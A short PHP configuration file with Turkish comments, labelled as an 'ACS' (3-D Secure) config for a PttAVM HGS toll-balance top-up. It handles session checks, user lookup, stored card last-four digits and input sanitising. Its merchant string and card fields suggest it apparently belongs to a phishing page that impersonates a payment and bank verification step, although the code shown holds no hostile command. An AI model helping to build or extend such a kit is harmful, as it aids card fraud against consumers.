<?php
// ACS Config - HGS Sistemi için uyarlanmıştır

// Config dosyasını dahil et
require_once '../config.php';

// Veritabanı bağlantısı
$pdo = getDbConnection();

// Session başlat
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: ../index.php');
    exit;
}

// Kullanıcı IP'sini al
$ip = $_SERVER['REMOTE_ADDR'];

// İşyeri adı
$isyeri = 'PttAVM HGS Bakiye Yükleme';

// Kullanıcı bilgilerini al
$userIdentifier = $_SESSION['userIdentifier'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_identifier = ?");
$stmt->execute([$userIdentifier]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);

// Session değişkenlerini ayarla
$cc_last_4 = $_SESSION['cc_last_4'] ?? '';
$no_last_4 = $_SESSION['no_last_4'] ?? '';

// Güvenlik fonksiyonu
function guvenlik($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}
?>
